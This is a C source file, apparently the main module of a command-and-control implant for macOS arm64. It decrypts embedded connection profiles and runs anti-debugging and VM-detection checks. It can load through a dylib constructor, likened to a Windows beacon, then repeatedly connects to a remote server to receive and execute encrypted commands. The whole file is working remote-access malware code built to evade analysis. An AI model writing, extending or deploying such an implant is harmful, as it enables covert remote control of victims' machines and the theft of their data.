#include "types.h"
#include "crt.h"
#include "msgpack.h"
#include "crypt.h"
#include "connector.h"
#include "agent_info.h"
#include "commander.h"
#include "jobs.h"
#include "opsec.h"
#include "dyld_resolve.h"
#include "config.h"

#include <unistd.h>

/// ---- Debug tracing (temporary — uses direct syscall to stderr) ----
/// Writes a short marker to stderr to trace execution flow
/// Remove after debugging is complete
#ifdef DEBUG_TRACE
#include "syscalls_arm64.h"
static void dbg(const char* msg) {
    size_t len = 0;
    const char* p = msg;
    while (*p++) len++;
    sys_write(2, msg, len);
    sys_write(2, "\n", 1);
}
#else
#define dbg(msg) ((void)0)
#endif

/// Global state
static int ACTIVE = 1;

/// Decode an encrypted profile blob
/// Input: [key 16B][AES-128-GCM encrypted msgpack(Profile)]
/// Extracts: addresses[], banner_size, conn_timeout, conn_count, use_ssl, type
typedef struct {
    uint32_t  type;
    char**    addresses;
    uint32_t  addr_count;
    int       banner_size;
    int       conn_timeout;
    int       conn_count;
    int       use_ssl;
    uint8_t   enc_key[16];  // profile encryption key
} profile_t;

static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t* prof) {
#ifdef DEBUG_TRACE
    // Debug: print profile size and first bytes
    {
        char tmp[128];
        char hex[] = "0123456789abcdef";
        int pos = 0;
        const char* prefix = "  prof_size=";
        while (*prefix) tmp[pos++] = *prefix++;
        // itoa inline for enc_size
        char numbuf[16]; int ni = 0;
        uint32_t v = enc_size;
        do { numbuf[ni++] = '0' + (v % 10); v /= 10; } while (v > 0);
        while (ni > 0) tmp[pos++] = numbuf[--ni];
        tmp[pos++] = ' '; tmp[pos++] = 'k'; tmp[pos++] = 'e'; tmp[pos++] = 'y'; tmp[pos++] = '=';
        for (int b = 0; b < 4 && b < (int)enc_size; b++) {
            tmp[pos++] = hex[(enc_data[b] >> 4) & 0xf];
            tmp[pos++] = hex[enc_data[b] & 0xf];
        }
        tmp[pos++] = '.'; tmp[pos++] = '.';
        tmp[pos] = '\0';
        dbg(tmp);
    }
#endif
    if (enc_size < 16 + GCM_NONCE_SIZE + GCM_TAG_SIZE) { dbg("  [!] too small"); return -1; }

    dbg("  [D1] memcpy key");
    // Extract key (first 16 bytes)
    ax_memcpy(prof->enc_key, enc_data, 16);

    // Decrypt the rest
    dbg("  [D2] calling gcm_decrypt");
    size_t pt_len;
    uint8_t* plaintext = aes128_gcm_decrypt(enc_data + 16, enc_size - 16, prof->enc_key, &pt_len);
    if (!plaintext) { dbg("  [!] decrypt FAILED (tag mismatch?)"); return -1; }
    dbg("  [D3] decrypt OK");

#ifdef DEBUG_TRACE
    {
        char ptbuf[64];
        int pi = 0;
        const char* pp = "  [D3a] pt_len=";
        while (*pp) ptbuf[pi++] = *pp++;
        size_t pv = pt_len;
        char nb[16]; int ni = 0;
        do { nb[ni++] = '0' + (pv % 10); pv /= 10; } while (pv > 0);
        while (ni > 0) ptbuf[pi++] = nb[--ni];
        ptbuf[pi] = '\0';
        dbg(ptbuf);
    }
#endif

    // Parse msgpack Profile struct
    dbg("  [D4] mp_reader_init");
    mp_reader_t r;
    mp_reader_init(&r, plaintext, pt_len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        dbg("  [!] mp_read_map failed");
        ax_free(plaintext, pt_len);
        return -1;
    }
    dbg("  [D5] parsing fields");

    // Initialize defaults
    prof->type = 0;
    prof->addresses = (char**)0;
    prof->addr_count = 0;
    prof->banner_size = 0;
    prof->conn_timeout = 10;
    prof->conn_count = 1000000000;
    prof->use_ssl = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 4 && ax_memcmp(key, "type", 4) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->type = (uint32_t)v;
        } else if (klen == 9 && ax_memcmp(key, "addresses", 9) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) == 0) {
                prof->addresses = (char**)ax_malloc(arr_count * sizeof(char*));
                prof->addr_count = arr_count;
                for (uint32_t j = 0; j < arr_count; j++) {
                    const char* addr; uint32_t alen;
                    mp_read_str(&r, &addr, &alen);
                    prof->addresses[j] = (char*)ax_malloc(alen + 1);
                    ax_memcpy(prof->addresses[j], addr, alen);
                    prof->addresses[j][alen] = '\0';
                }
            }
        } else if (klen == 11 && ax_memcmp(key, "banner_size", 11) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->banner_size = (int)v;
        } else if (klen == 12 && ax_memcmp(key, "conn_timeout", 12) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->conn_timeout = (int)v;
        } else if (klen == 10 && ax_memcmp(key, "conn_count", 10) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->conn_count = (int)v;
        } else if (klen == 7 && ax_memcmp(key, "use_ssl", 7) == 0) {
            bool v; mp_read_bool(&r, &v); prof->use_ssl = v ? 1 : 0;
        } else {
            mp_skip(&r);
        }
    }
    dbg("  [D6] fields parsed, freeing plaintext");

#ifdef DEBUG_TRACE
    // Debug: check the alloc header before freeing
    {
        typedef struct { size_t total_size; } _ahdr_t;
        #define _HSIZE ((sizeof(_ahdr_t) + 15) & ~15)
        _ahdr_t* _hdr = (_ahdr_t*)((uint8_t*)plaintext - _HSIZE);
        char fbuf[80];
        int fi = 0;
        const char* fp = "  [D6a] free: total_size=";
        while (*fp) fbuf[fi++] = *fp++;
        size_t fv = _hdr->total_size;
        char nb[20]; int ni = 0;
        do { nb[ni++] = '0' + (fv % 10); fv /= 10; } while (fv > 0);
        while (ni > 0) fbuf[fi++] = nb[--ni];
        const char* ep = " expected=";
        while (*ep) fbuf[fi++] = *ep++;
        fv = _HSIZE + pt_len;
        ni = 0;
        do { nb[ni++] = '0' + (fv % 10); fv /= 10; } while (fv > 0);
        while (ni > 0) fbuf[fi++] = nb[--ni];
        fbuf[fi] = '\0';
        dbg(fbuf);
        #undef _HSIZE
    }
#endif

    ax_free(plaintext, pt_len);
    dbg("  [D7] decode_profile done");
    return 0;
}

static void free_profile(profile_t* prof) {
    if (prof->addresses) {
        for (uint32_t i = 0; i < prof->addr_count; i++) {
            if (prof->addresses[i]) {
                ax_free(prof->addresses[i], ax_strlen(prof->addresses[i]) + 1);
            }
        }
        ax_free(prof->addresses, prof->addr_count * sizeof(char*));
    }
}

/// Build the init message: msgpack(StartMsg{type:1, data:msgpack(InitPack{id, type, data:sessionInfo})})
static int build_init_msg(uint32_t agent_id, uint32_t profile_type,
                          const uint8_t* session_info, size_t si_len,
                          const uint8_t* enc_key,
                          uint8_t** out_msg, size_t* out_len) {
    // Inner: InitPack — declaration order: Id, Type, Data → tags: id, type, data
    mp_writer_t inner;
    mp_writer_init(&inner, 256);
    mp_write_map(&inner, 3);
    mp_write_kv_uint(&inner, "id", agent_id);
    mp_write_kv_uint(&inner, "type", profile_type);
    mp_write_kv_bin(&inner, "data", session_info, (uint32_t)si_len);

    // Outer: StartMsg — declaration order: Type, Data → tags: id, data
    mp_writer_t outer;
    mp_writer_init(&outer, 256);
    mp_write_map(&outer, 2);
    mp_write_kv_int(&outer, "id", INIT_PACK);
    mp_write_kv_bin(&outer, "data", inner.buf.data, (uint32_t)inner.buf.len);

    mp_writer_free(&inner);

    // Encrypt with profile key
    size_t enc_len;
    uint8_t* encrypted = aes128_gcm_encrypt(outer.buf.data, outer.buf.len, enc_key, &enc_len);
    mp_writer_free(&outer);

    if (!encrypted) return -1;

    *out_msg = encrypted;
    *out_len = enc_len;
    return 0;
}

/// Parse Message{type: int8, object: [][]byte} from decrypted data
static int parse_message(const uint8_t* data, size_t len,
                         int8_t* msg_type,
                         const uint8_t*** objects, uint32_t** obj_sizes,
                         uint32_t* obj_count) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    *msg_type = 0;
    *objects = (const uint8_t**)0;
    *obj_sizes = (uint32_t*)0;
    *obj_count = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;

        if (klen == 6 && ax_memcmp(key, "object", 6) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) != 0) return -1;

            *objects = (const uint8_t**)ax_malloc(arr_count * sizeof(uint8_t*));
            *obj_sizes = (uint32_t*)ax_malloc(arr_count * sizeof(uint32_t));
            *obj_count = arr_count;

            for (uint32_t j = 0; j < arr_count; j++) {
                const uint8_t* bin_data;
                uint32_t bin_len;
                if (mp_read_bin(&r, &bin_data, &bin_len) != 0) return -1;
                (*objects)[j] = bin_data;
                (*obj_sizes)[j] = bin_len;
            }
        } else if (klen == 4 && ax_memcmp(key, "type", 4) == 0) {
            int64_t v;
            if (mp_read_int(&r, &v) != 0) return -1;
            *msg_type = (int8_t)v;
        } else {
            mp_skip(&r);
        }
    }
    return 0;
}

/// Parse a single Command from msgpack: {code: uint, id: uint, data: []byte}
static int parse_command(const uint8_t* data, size_t len,
                         uint32_t* code, uint32_t* cmd_id,
                         const uint8_t** cmd_data, uint32_t* cmd_data_len) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    *code = 0; *cmd_id = 0; *cmd_data = (uint8_t*)0; *cmd_data_len = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;

        if (klen == 4 && ax_memcmp(key, "code", 4) == 0) {
            uint64_t v; mp_read_uint(&r, &v); *code = (uint32_t)v;
        } else if (klen == 2 && ax_memcmp(key, "id", 2) == 0) {
            uint64_t v; mp_read_uint(&r, &v); *cmd_id = (uint32_t)v;
        } else if (klen == 4 && ax_memcmp(key, "data", 4) == 0) {
            mp_read_bin(&r, cmd_data, cmd_data_len);
        } else {
            mp_skip(&r);
        }
    }
    return 0;
}

/// ---- Main entry point ----

static int agent_main(void);

#ifdef BUILD_DYLIB
// Dylib/shellcode mode: constructor runs when dylib is loaded via dlopen()
// Equivalent to DllMain(DLL_PROCESS_ATTACH) on Windows beacon
__attribute__((constructor))
static void dylib_entry(void) {
    agent_main();
}
#else
// Standard executable mode
int main(void) {
    return agent_main();
}
#endif

static int agent_main(void) {
    dbg("[1] dyld_resolver_init");
    // OPSEC: initialize dyld hash-based API resolver (MUST be first — opsec uses R_* macros)
    if (dyld_resolver_init() != 0) { dbg("[!] dyld_resolver_init FAILED"); return 0; }
    dbg("[2] dyld_resolver_init OK");

    // OPSEC: anti-debug, VM detection
    dbg("[3] opsec_check");
    if (opsec_check() != 0) { dbg("[!] opsec_check FAILED"); return 0; }
    dbg("[4] opsec_check OK");

    // Decode profiles from config
    profile_t profiles[8];
    uint32_t  profile_count = 0;

    // Debug: print PROFILE_COUNT to verify correct config.h was used
#ifdef DEBUG_TRACE
    {
        char pcbuf[64];
        int pci = 0;
        const char* pcp = "[5a] PROFILE_COUNT=";
        while (*pcp) pcbuf[pci++] = *pcp++;
        int pc = PROFILE_COUNT;
        if (pc == 0) { pcbuf[pci++] = '0'; }
        else {
            char nb[8]; int ni = 0;
            while (pc > 0) { nb[ni++] = '0' + (pc % 10); pc /= 10; }
            while (ni > 0) pcbuf[pci++] = nb[--ni];
        }
        pcbuf[pci] = '\0';
        dbg(pcbuf);
    }
#endif
    dbg("[5b] before loop");
#if PROFILE_COUNT > 0
    dbg("[5c] entering loop");
    for (int i = 0; i < PROFILE_COUNT && i < 8; i++) {
#ifdef DEBUG_TRACE
        {
            char ibuf[64];
            int ii = 0;
            const char* ip = "[5d] profile i=";
            while (*ip) ibuf[ii++] = *ip++;
            ibuf[ii++] = '0' + i;
            const char* sp = " size=";
            while (*sp) ibuf[ii++] = *sp++;
            uint32_t sz = enc_profile_sizes[i];
            char nb[12]; int ni = 0;
            do { nb[ni++] = '0' + (sz % 10); sz /= 10; } while (sz > 0);
            while (ni > 0) ibuf[ii++] = nb[--ni];
            ibuf[ii] = '\0';
            dbg(ibuf);
        }
#endif
        if (decode_profile(enc_profiles[i], enc_profile_sizes[i], &profiles[profile_count]) == 0) {
            dbg("[5e] profile decoded OK");
            profile_count++;
        } else {
            dbg("[5e] profile decode FAILED");
        }
    }
#endif

    if (profile_count == 0) { dbg("[!] profile_count == 0"); return 1; }
    dbg("[6] profiles decoded OK");

    // Create session info
    mp_writer_t si_writer;
    mp_writer_init(&si_writer, 512);
    uint8_t session_key[16];
    dbg("[7] create_session_info");
    if (create_session_info(&si_writer, session_key) != 0) { dbg("[!] session_info FAILED"); return 1; }
    dbg("[8] session_info OK");

    // Generate random agent ID
    uint8_t id_buf[4];
    ax_random_bytes(id_buf, 4);
    uint32_t agent_id = ((uint32_t)id_buf[0] << 24) | ((uint32_t)id_buf[1] << 16) |
                        ((uint32_t)id_buf[2] << 8)  | id_buf[3];

    // Keep session info for reuse across profile rotations (Go agent does the same)
    uint8_t* session_info_data = (uint8_t*)ax_malloc(si_writer.buf.len);
    size_t session_info_len = si_writer.buf.len;
    ax_memcpy(session_info_data, si_writer.buf.data, si_writer.buf.len);
    mp_writer_free(&si_writer);

    // Initialize job context for async operations
    jobs_init(&g_job_ctx);
    g_job_ctx.agent_id = agent_id;
    ax_memcpy(g_job_ctx.session_key, session_key, 16);

    // Build init message
    uint32_t prof_idx = 0;
    profile_t* prof = &profiles[prof_idx];

    uint8_t* init_msg = (uint8_t*)0;
    size_t init_msg_len = 0;
    dbg("[9] build_init_msg");
    build_init_msg(agent_id, prof->type,
                   session_info_data, session_info_len,
                   prof->enc_key,
                   &init_msg, &init_msg_len);

    if (!init_msg) { dbg("[!] init_msg NULL"); ax_free(session_info_data, session_info_len); return 1; }
    dbg("[10] init_msg OK, entering connect loop");

    // Main reconnect loop
    uint32_t addr_idx = 0;

    for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
        if (attempt > 0) {
            R_sleep((unsigned int)prof->conn_timeout);
            addr_idx++;
            if (addr_idx >= prof->addr_count) {
                addr_idx = 0;
                // Rotate to next profile (same sessionInfo, different enc key)
                prof_idx = (prof_idx + 1) % profile_count;
                prof = &profiles[prof_idx];

                ax_free(init_msg, init_msg_len);
                build_init_msg(agent_id, prof->type,
                               session_info_data, session_info_len,
                               prof->enc_key,
                               &init_msg, &init_msg_len);
            }
        }

        // Update job context with current connection info
        jobs_update_connection(&g_job_ctx, prof->addresses[addr_idx],
                              prof->banner_size, prof->enc_key, prof->type);

        // Connect
        dbg("[11] conn_open");
        connector_t conn;
        if (conn_open(&conn, prof->addresses[addr_idx]) != 0) { dbg("[!] conn_open FAILED"); continue; }
        dbg("[12] connected OK");

        // Reset attempt counter on successful connect
        attempt = 0;

        // Read banner
        if (prof->banner_size > 0) {
            dbg("[13] discard banner");
            if (conn_discard(&conn, (size_t)prof->banner_size) != 0) {
                dbg("[!] banner discard FAILED");
                conn_close(&conn);
                continue;
            }
        }

        // Send init
        dbg("[14] send init");
        if (conn_send_msg(&conn, init_msg, init_msg_len) != 0) {
            dbg("[!] send init FAILED");
            conn_close(&conn);
            continue;
        }
        dbg("[15] init sent OK, entering command loop");

        // Command loop
        while (ACTIVE) {
            uint8_t* recv_data = (uint8_t*)0;
            size_t recv_len = 0;

            if (conn_recv_msg(&conn, &recv_data, &recv_len) != 0) break;

            // Decrypt with session key
            size_t plain_len;
            uint8_t* plaintext = aes128_gcm_decrypt(recv_data, recv_len, session_key, &plain_len);
            ax_free(recv_data, recv_len);
            if (!plaintext) break;

            // Parse Message
            int8_t msg_type;
            const uint8_t** objects = (const uint8_t**)0;
            uint32_t* obj_sizes = (uint32_t*)0;
            uint32_t obj_count = 0;

            if (parse_message(plaintext, plain_len, &msg_type, &objects, &obj_sizes, &obj_count) != 0) {
                ax_free(plaintext, plain_len);
                break;
            }

            // Build response Message — declaration order: type, object
            mp_writer_t msg_writer;
            mp_writer_init(&msg_writer, 1024);
            mp_write_map(&msg_writer, 2);

            if (msg_type == 1 && obj_count > 0) {
                // "type" first (declaration order)
                mp_write_kv_int(&msg_writer, "type", 1);

                // "object" array
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, obj_count);

                for (uint32_t i = 0; i < obj_count; i++) {
                    uint32_t code, cmd_id;
                    const uint8_t* cmd_data;
                    uint32_t cmd_data_len;
                    parse_command(objects[i], obj_sizes[i],
                                 &code, &cmd_id, &cmd_data, &cmd_data_len);

                    mp_writer_t cmd_resp;
                    mp_writer_init(&cmd_resp, 256);

                    int ret = handle_command(code, cmd_id, cmd_data, cmd_data_len, &cmd_resp);
                    if (ret == -99) ACTIVE = 0;

                    // Wrap response in Command{code, id, data} — server expects this format
                    mp_writer_t wrapped;
                    mp_writer_init(&wrapped, 256);
                    mp_write_map(&wrapped, 3);
                    mp_write_kv_uint(&wrapped, "code", code);
                    mp_write_kv_uint(&wrapped, "id", cmd_id);
                    mp_write_kv_bin(&wrapped, "data", cmd_resp.buf.data, (uint32_t)cmd_resp.buf.len);

                    mp_write_bin(&msg_writer, wrapped.buf.data, (uint32_t)wrapped.buf.len);
                    mp_writer_free(&cmd_resp);
                    mp_writer_free(&wrapped);
                }
            } else {
                // Empty response
                mp_write_kv_int(&msg_writer, "type", 0);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, 0);
            }

            // Encrypt and send
            {
                size_t enc_len;
                uint8_t* encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
                                                         session_key, &enc_len);
                mp_writer_free(&msg_writer);

                if (encrypted) {
                    conn_send_msg(&conn, encrypted, enc_len);
                    ax_free(encrypted, enc_len);
                }
            }

            // Cleanup
            if (objects) ax_free((void*)objects, obj_count * sizeof(uint8_t*));
            if (obj_sizes) ax_free(obj_sizes, obj_count * sizeof(uint32_t));
            ax_free(plaintext, plain_len);
        }

        conn_close(&conn);
    }

    // Cleanup
    ax_free(init_msg, init_msg_len);
    ax_free(session_info_data, session_info_len);
    for (uint32_t i = 0; i < profile_count; i++)
        free_profile(&profiles[i]);

    return 0;
}
